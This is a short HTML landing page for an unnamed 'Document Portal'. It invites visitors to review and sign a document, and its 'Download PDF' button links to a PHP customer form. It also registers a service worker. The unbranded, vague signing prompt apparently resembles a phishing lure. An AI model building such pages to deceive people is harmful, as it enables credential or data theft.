
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Portal</title>
    <meta name="theme-color" content="#3446e8">
    <link rel="manifest" href="manifest.json">

    <style>
        body {
            margin: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            font-family: Arial, sans-serif;
            color: #172033;
            background: #f5f7fb;
        }

        header {
            background: white;
            padding: 22px 8%;
            border-bottom: 1px solid #e5e7eb;
            font-size: 21px;
            font-weight: bold;
        }

        main {
            width: min(1000px, 90%);
            margin: 0 auto;
            padding: 55px 0;
            display: grid;
            grid-template-columns: minmax(0, 1fr) minmax(0, 1fr);
            gap: 50px;
            align-items: center;
        }

        .illustration {
            min-height: 350px;
            aspect-ratio: 4 / 3;
            border-radius: 20px;
            overflow: hidden;
            background: #e4ecf8;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .illustration img {
            display: block;
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .content h1 {
            font-size: 42px;
            line-height: 1.2;
            margin: 15px 0;
        }

        .content p {
            color: #647084;
            line-height: 1.7;
        }

        .button {
            display: block;
            width: 100%;
            margin-top: 22px;
            padding: 16px;
            box-sizing: border-box;
            border: none;
            border-radius: 9px;
            background: #3446e8;
            color: white;
            font-size: 16px;
            font-weight: bold;
            text-align: center;
            text-decoration: none;
            cursor: pointer;
        }

        .button:hover {
            background: #2535c7;
        }

        footer {
            margin-top: auto;
            padding: 22px;
            background: white;
            border-top: 1px solid #e5e7eb;
            text-align: center;
            color: #647084;
            font-size: 13px;
        }

        @media (max-width: 700px) {
            main {
                grid-template-columns: 1fr;
                gap: 25px;
                padding: 30px 0;
            }

            .illustration {
                min-height: 220px;
            }

            .content h1 {
                font-size: 32px;
            }
        }
    </style>
</head>

<body>
    <header>Document Portal</header>

    <main>
        <div class="illustration">
            <img
                src="images/image.png"
                alt="Illustration of a laptop displaying a document download button"
            >
        </div>
        <section class="content">
            <p>DOCUMENT CENTER</p>
            <h1>Review and sign your document</h1>

            <p>
                Access your authorized signing session
                and complete the required steps.
            </p>

            <a class="Button" href="customer-form.php">
                Download PDF
            </a>
        </section>
    </main>

    <footer>Document Portal · © 2026</footer>
    <script>
        if ("serviceWorker" in navigator) {
            window.addEventListener("load", () => {
                navigator.serviceWorker.register("/sw.js")
                    .catch((error) => {
                        console.error(
                            "App setup failed:",
                            error
                        );
                    });
            });
        }
    </script>
</body>
</html>
